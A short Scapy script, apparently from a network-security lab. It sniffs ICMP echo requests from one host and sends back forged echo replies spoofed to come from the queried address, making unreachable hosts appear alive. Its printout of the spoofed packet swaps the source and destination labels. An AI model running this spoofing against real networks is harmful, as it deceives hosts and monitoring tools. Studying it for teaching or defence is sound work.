from scapy.all import*

def spoof_pkt(pkt):
	if ICMP in pkt and pkt[ICMP].type==8:
		print("Original Packet.......")
		print("Source IP : ",pkt[IP].src)
		print("Destination IP: ",pkt[IP].dst)

		ip=IP(src=pkt[IP].dst,dst=pkt[IP].src,ihl=pkt[IP].ihl)
		ip.ttl=99
		icmp=ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)
	
		if pkt.haslayer(Raw):
			data=pkt[Raw].load
			newpkt=ip/icmp/data
		else:
			newpkt=ip/icmp
	
		print("Spoofed Packet...........")
		print("Source IP :",newpkt[IP].dst)
		print("Destination IP :",newpkt[IP].src)
	
		send(newpkt,verbose=0)
	''' verbose=0 Only critical or error messages might be shown
	           =1 Basic information about operations might shown
	           =2 and higher: More detailed logs and debug information are provided '''	     	

sniff(filter='icmp and src host 10.0.2.15',prn=spoof_pkt)


